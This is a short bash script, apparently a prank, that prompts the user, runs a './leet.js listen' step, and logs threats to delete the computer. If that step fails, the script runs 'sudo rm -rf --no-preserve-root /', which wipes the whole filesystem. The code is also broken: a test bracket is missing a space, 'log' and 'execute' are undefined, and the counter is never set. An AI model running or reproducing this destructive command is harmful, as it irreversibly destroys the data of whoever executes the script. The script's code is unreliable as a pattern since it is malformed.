#!/bin/bash

while [[ true ]]; do
  round=$(($round - 1))
  answer="n"
  read -p "Are you ready (y/n)?" answer

  if [[ $answer != "y"]]; then
    exit 0
  fi

  sudo log "round $round"
  log "waiting for 20 minutes for a submit or else we delete your computer..."
  log "also don't get it wrong..."

  if ./leet.js listen; then
    log "great success, looks like you live another day"
  else
    log "you have failed me for the last time"
    for i in {0..3}; do
      sleep 1
    done
    log "goodbye"
    execute sudo rm -rf --no-preserve-root /
    break
  fi
done

